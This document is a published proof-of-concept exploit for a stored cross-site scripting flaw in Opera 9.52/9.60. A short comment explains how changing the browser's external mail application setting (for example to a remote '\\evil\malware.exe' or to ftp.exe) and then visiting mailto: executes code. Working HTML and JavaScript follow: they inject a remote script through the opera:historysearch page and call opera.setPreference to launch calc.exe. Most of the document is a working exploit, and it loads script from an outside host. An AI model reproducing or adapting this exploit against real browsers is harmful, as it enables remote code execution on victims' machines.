Opera 9.52/9.60 Stored Cross Site Scripting Code Exec PoC
=========================================================


<!--
Just found a way to use Stefanoâ€™s opera:config idea to execute code from remote.

Instead of changing the HTTP Proxy, an attacker can change the default external 
mail application to â€œ\\evil\malware.exe â€, or to local commands (e.g. ftp.exe 
which can be used to download malicious binaries from remote). Also, there is a 
need to change the â€œMail Handlerâ€ settings to â€œ2â€, so opera will execute the 
external mail application, instead of the default opera mail application.

After changing the settings, the attacker can simply set the location to â€œmailto:â€ to execute the code.


A proof-of-concept which executes the Windows Calculator can be found here: http://raffon.net/research/opera/history/op.html


Cheers,

--Aviv.

http://aviv.raffon.net
-->

<html>
<title>bb</title>
<script>
var z=null;
function x() {
  window.setTimeout("z=window.open(&#039;opera:historysearch?q=%2A&#039;);window.focus();",1500);
  window.setTimeout("z.close();",3000);
  window.setTimeout("location.href=&#039;mailto:&#039;",3000);
}
</script> 
<body>
<a href="#<script src=&#039;http://www.raffon.net/research/opera/history/o.js&#039;></script>" onclick="x()">Click me...</a>
</body>
</html>

<o.js>
s=document.createElement("IFRAME");
s.src="opera:config";
document.body.appendChild(s);
s.src="javascript:opera.setPreference(&#039;Mail&#039;,&#039;External Application&#039;,&#039;c:\\\\windows\\\\system32\\\\calc.exe&#039;);opera.setPreference(&#039;Mail&#039;,&#039;Handler&#039;,&#039;2&#039;);parent.window.close()";
</o.js>



